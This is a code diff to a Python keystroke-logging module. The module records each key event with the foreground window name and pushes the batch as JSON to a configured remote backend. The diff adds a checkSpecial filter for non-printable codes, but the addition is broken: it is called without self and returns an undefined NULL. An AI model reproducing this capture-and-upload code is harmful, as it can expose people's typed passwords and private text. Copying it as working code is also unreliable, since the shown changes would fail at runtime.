@@ -4,6 +4,7 @@ Handles storing of keyevents and pushing to backend
 
 import json
 import requests
+import re
 
 class EventManager:
     def __init__ (self, cfg):
@@ -43,7 +44,6 @@ class EventManager:
     def __pushHistoryToBackend(self):
         try:
             print("Pushing data to backend")
-            # TODO: push to api (POST to hotchips)
             payload = {}
             i = 0
             for e in range(self.historyCount):
@@ -52,7 +52,6 @@ class EventManager:
             self.history = {}
             self.historyCount = 0
             
-            # print(payload)
             jsonObj= json.dumps(payload)
             print(jsonObj)
             url = self.main_cfg['apiHost'] + self.main_cfg['endpointPushKeys']
@@ -70,10 +69,10 @@ class KeyEvent:
         self.isKeyDown = isKeyDown # e.g. 'key up' or 'key down'
         self.windowName = windowName # Name of the foreground window at the time of the event
         self.asciiCode = asciiCode # integer
-        self.asciiChar = asciiChar # char
+        self.asciiChar = checkSpecial(asciiCode,asciiChar) # char
         self.keyName = keyName # string
         self.isCaps = isCaps # isCapital?
-        self.processedKey = processedKey # `asciiChar` after parsing with caps
+        self.processedKey = checkSpecial(asciiCode,processedKey) # `asciiChar` after parsing with caps
         
     def __str__(self):
         return f"KeyEvent(\n\tdatetime: {self.datetime}\n\tepochTime: {self.epochTime}\n\tisKeyDown: {self.isKeyDown}\n\twindowName: {self.windowName}\n\tasciiCode: {self.asciiCode}\n\tasciiChar: {self.asciiChar}\n\tkeyName: {self.keyName}\n\tisCaps: {self.isCaps}\n\tprocessedKey: {self.processedKey}\n)"
@@ -90,3 +89,11 @@ class KeyEvent:
         res["isCaps"] = self.isCaps
         res["processedKey"] = self.processedKey
         return json.dumps(res)
+    '''
+    Only return keys which have valid Ascii codes, otherwise it will affect populating the SQL database
+    '''
+    def checkSpecial(self,code,key):
+        if(code < 127 and code > 32):
+            return key
+        else:
+            return NULL
